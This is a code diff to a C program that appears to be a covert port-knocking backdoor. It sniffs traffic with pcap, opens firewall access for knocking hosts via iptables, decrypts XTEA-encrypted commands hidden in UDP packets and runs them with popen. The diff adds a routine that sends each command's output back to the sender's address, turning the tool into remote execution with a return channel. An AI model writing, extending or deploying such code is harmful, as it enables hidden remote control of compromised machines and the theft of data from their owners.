@@ -9,6 +9,7 @@
 #include <sys/types.h>
 #include <syslog.h>
 #include <unistd.h>
+#include "clntsrvr.h"
 #include "pkthdr.h"
 #include "util.h"
 #include "xtea.h"
@@ -85,20 +86,30 @@ u_char datalink_length(pcap_t *session)
 /*{*/
 /*}*/
 
-void open_the_gate(uint32_t srcip, uint16_t port)
+int network_ip_to_string(uint32_t netip, char* buf, size_t len)
 {
-    char sourceip[INET_ADDRSTRLEN];
-    char iptablescmd[512];
-    struct in_addr srcaddr;
-    int rtn;
+    struct in_addr addr;
+    addr.s_addr = netip;
 
-    srcaddr.s_addr = srcip;
-
-    if (!inet_ntop(AF_INET, &srcaddr, sourceip, sizeof(sourceip)))
+    if (!inet_ntop(AF_INET, &addr, buf, len))
     {
         #ifdef DEBUG
         syslog(LOG_ERR, "inet_ntop(): %s", strerror(errno));
         #endif
+        return -1;
+    }
+    return 0;
+}
+
+void open_the_gate(uint32_t srcip, uint16_t port)
+{
+    char sourceip[INET_ADDRSTRLEN];
+    char iptablescmd[512];
+    int rtn;
+
+    if (network_ip_to_string(srcip, sourceip, INET_ADDRSTRLEN))
+    {
+        return;
     }
 
     #ifdef DEBUG
@@ -115,10 +126,8 @@ void open_the_gate(uint32_t srcip, uint16_t port)
         #ifdef DEBUG
         syslog(LOG_ERR, "iptables command: %d", rtn);
         #endif
+        return;
     }
-    #ifdef DEBUG
-    syslog(LOG_INFO, "closing port %d for %s", port, sourceip);
-    #endif
 }
 
 void answer_knock(struct ip_header *iph)
@@ -181,6 +190,8 @@ void exec_command(struct ip_header *iph)
     uint32_t key[4];
     FILE* f;
     char buf[BUFSIZE];
+    char srcaddr[INET_ADDRSTRLEN];
+    char dstaddr[INET_ADDRSTRLEN];
     size_t read;
     struct udp_header *udph = (struct udp_header *)
             ((char *) iph + sizeof(struct ip_header));
@@ -207,11 +218,19 @@ void exec_command(struct ip_header *iph)
     f = popen(command, "r");
     read = fread(buf, sizeof(char), BUFSIZE - 1, f);
     buf[read] = '\0';
-    syslog(LOG_INFO, buf);
     pclose(f);
+    syslog(LOG_INFO, buf);
 
     /* don't leave key in memory */
     memset(key, '\0', sizeof(uint32_t) / sizeof(char) * 4);
+
+    if (network_ip_to_string(iph->srcip, srcaddr, sizeof(srcaddr))
+     || network_ip_to_string(iph->dstip, dstaddr, sizeof(dstaddr)))
+    {
+        return;
+    }
+    /* send the results back to the client */
+    client(srcaddr, dstaddr, buf, read);
 }
 
 void inspect_udp(struct ip_header *iph)
